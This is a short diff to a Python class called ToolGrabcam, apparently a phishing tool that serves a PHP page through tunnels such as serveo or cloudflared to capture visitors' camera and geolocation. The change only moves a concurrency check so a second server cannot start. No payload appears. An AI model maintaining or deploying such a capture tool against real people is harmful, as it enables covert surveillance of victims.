@@ -557,6 +557,11 @@ class ToolGrabcam(ToolBase):
         method = (params.get("method") or "php_only").strip().lower()
         if method not in ("serveo", "php_only", "localhost_run", "cloudflared"):
             method = "php_only"
+        with _lock:
+            if _state.get("running"):
+                return {"success": False, "error": "Сервер уже запущен. Сначала нажмите «Остановить»."}
+            _state["error"] = None
+            _state["method"] = method
         options = {
             "camera": bool(params.get("camera", True)),
             "geo": bool(params.get("geo", True)),
@@ -573,14 +578,10 @@ class ToolGrabcam(ToolBase):
         # Выбираем порт под сессию (первый свободный).
         port = _find_free_port() or _PHP_PORT
         with _lock:
-            _state["php_port"] = port
-        _refresh_payload(f"http://127.0.0.1:{port}")
-
-        with _lock:
-            _state["error"] = None
-            _state["method"] = method
             if _state.get("running"):
                 return {"success": False, "error": "Сервер уже запущен. Сначала нажмите «Остановить»."}
+            _state["php_port"] = port
+        _refresh_payload(f"http://127.0.0.1:{port}")
 
         if not _php_available():
             return {"success": False, "error": "PHP не найден. Установите PHP (apt install php, dnf install php и т.д.)."}
